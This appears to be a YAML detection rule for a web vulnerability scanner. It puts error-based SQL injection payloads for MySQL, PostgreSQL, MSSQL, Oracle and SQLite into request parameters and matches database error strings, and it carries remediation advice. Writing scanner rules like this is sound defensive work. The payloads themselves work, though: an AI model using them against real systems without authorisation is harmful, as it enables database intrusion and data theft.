rule_name: Error-based SQL Injection
description: "Detects error-based SQL injection vulnerabilities via database error messages across MySQL, PostgreSQL, MSSQL, Oracle, and SQLite."

transform:
  query:
    transformations:
      - replace_all_values_one_by_one:
          # ── Unclosed quotes / broken syntax (universal) ──
          - "'"
          - "'\""
          - "' AND '"
          - "\"--"
          - "';"
          - "')--"
          - "\")"
          - "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x716b6a6271,(SELECT (ELT(1=1,1))),0x7162706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
          # ── MySQL error extractors ──
          - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
          - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--"
          - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
          - "' AND EXP(~(SELECT * FROM (SELECT version())a))--"
          - "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--"
          - "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--"
          # ── PostgreSQL error extractors ──
          - "' AND 1=CAST((SELECT version()) AS int)--"
          - "' AND 1=CAST(chr(126)||version()||chr(126) AS int)--"
          - "';SELECT CAST(version() AS int)--"
          - "' AND TO_NUMBER(version(),'9')=0--"
          # ── MSSQL error extractors ──
          - "' AND 1=CONVERT(int,(SELECT @@version))--"
          - "' AND 1=CONVERT(int,DB_NAME())--"
          - "';DECLARE @v INT=CAST(@@version AS INT)--"
          - "' AND 1=(SELECT TOP 1 CAST(name AS int) FROM sysobjects)--"
          # ── Oracle error extractors ──
          - "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--"
          - "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"
          - "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))--"
          - "' OR 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE ROWNUM=1),user,user)--"
          # ── SQLite error extractors ──
          - "' AND 1=CAST(sqlite_version() AS int)--"
          - "' UNION SELECT CAST(sqlite_version() AS int)--"
          - "' AND TYPEOF(ZEROBLOB(-1))--"
  body:
    transformations:
      - replace_all_values_one_by_one:
          # ── Unclosed quotes / broken syntax (universal) ──
          - "'"
          - "'\""
          - "' AND '"
          - "\"--"
          - "';"
          - "')--"
          - "\")"
          - "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x716b6a6271,(SELECT (ELT(1=1,1))),0x7162706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
          # ── MySQL error extractors ──
          - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
          - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--"
          - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
          - "' AND EXP(~(SELECT * FROM (SELECT version())a))--"
          - "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--"
          - "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--"
          # ── PostgreSQL error extractors ──
          - "' AND 1=CAST((SELECT version()) AS int)--"
          - "' AND 1=CAST(chr(126)||version()||chr(126) AS int)--"
          - "';SELECT CAST(version() AS int)--"
          - "' AND TO_NUMBER(version(),'9')=0--"
          # ── MSSQL error extractors ──
          - "' AND 1=CONVERT(int,(SELECT @@version))--"
          - "' AND 1=CONVERT(int,DB_NAME())--"
          - "';DECLARE @v INT=CAST(@@version AS INT)--"
          - "' AND 1=(SELECT TOP 1 CAST(name AS int) FROM sysobjects)--"
          # ── Oracle error extractors ──
          - "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--"
          - "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"
          - "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))--"
          - "' OR 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE ROWNUM=1),user,user)--"
          # ── SQLite error extractors ──
          - "' AND 1=CAST(sqlite_version() AS int)--"
          - "' UNION SELECT CAST(sqlite_version() AS int)--"
          - "' AND TYPEOF(ZEROBLOB(-1))--"
  header:
    transformations:
      - replace_all_values_one_by_one:
          # ── Unclosed quotes / broken syntax (universal) ──
          - "'"
          - "'\""
          - "' AND '"
          - "\"--"
          - "';"
          # ── MySQL ──
          - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
          - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--"
          # ── PostgreSQL ──
          - "' AND 1=CAST((SELECT version()) AS int)--"
          # ── MSSQL ──
          - "' AND 1=CONVERT(int,(SELECT @@version))--"

match_on:
  body:
    contains:
      # ---- MySQL ----
      - "you have an error in your sql syntax"
      - "sql syntax error"
      - "warning: mysql_"
      - "mysql_fetch_array()"
      - "mysql_num_rows()"
      - "mysql_fetch_assoc()"
      - "mysql_connect()"
      - "EXTRACTVALUE"
      - "UPDATEXML"
      - "Duplicate entry"
      # ---- PostgreSQL ----
      - "pg_query()"
      - "pg_exec()"
      - "unterminated quoted string"
      - "invalid input syntax for"
      - "ERROR:  syntax error at or near"
      - "current transaction is aborted"
      # ---- MSSQL ----
      - "unclosed quotation mark after the character string"
      - "conversion failed when converting"
      - "mssql_query()"
      - "Microsoft OLE DB Provider"
      - "Microsoft SQL Native Client"
      - "Incorrect syntax near"
      - "ODBC SQL Server Driver"
      - "[SQL Server]"
      # ---- Oracle ----
      - "ORA-"
      - "Oracle error"
      - "quoted string not properly terminated"
      - "oracle.jdbc.driver"
      - "SQL command not properly ended"
      # ---- SQLite ----
      - "SQLite3::query()"
      - "sqlite3.OperationalError"
      - "SQLITE_ERROR"
      - "unrecognized token"
      - "near \".\":  syntax error"
      # ---- Generic / Framework ----
      - "SQLSTATE["
      - "java.sql.SQLException"
      - "org.hibernate.exception"
      - "unknown column"
      - "unterminated string literal"
      - "PDOException"
      - "System.Data.SqlClient"
      - "Npgsql."
      - "Syntax error in SQL statement"
      - "SQL query syntax error"
      - "Unexpected end of command"

report:
  title: "Error-based SQL Injection indicators found"
  description: >-
    Injecting SQL metacharacters and error-extracting payloads into individual
    parameters caused the server to return database error signatures. Payloads
    target MySQL, PostgreSQL, MSSQL, Oracle, and SQLite to force type-cast
    errors, syntax violations, and function-based extraction.
    Original: {{original.method}} {{original.url}}
    Tested: {{req.method}} {{req.url}}
    Status: {{res.status}} | Content-Type: {{res.headers.Content-Type}}
  severity: critical
  cwe: "CWE-89"
  cvssScore: "9.0"
  mitigation: >-
    Use parameterized queries (prepared statements), apply strict server-side
    validation and encoding, disable verbose DB errors in production, and use
    least-privilege DB accounts.
  stepsToReproduce: |
    1) Send the baseline request: {{original.method}} {{original.url}}
    2) Re-send while replacing a single parameter value with a syntax-breaking or error-extracting payload.
    3) Observe response containing database error text (e.g., SQLSTATE[…], ORA-, syntax error, EXTRACTVALUE, CONVERT).
    4) Repeat for other parameters to confirm the scope.
  tags: "sqli,error-based,owasp-a03,mysql,postgres,mssql,oracle,sqlite"
  impact: >-
    Attackers can enumerate schema/data and potentially take over the database by
    exploiting query construction flaws revealed via verbose errors.
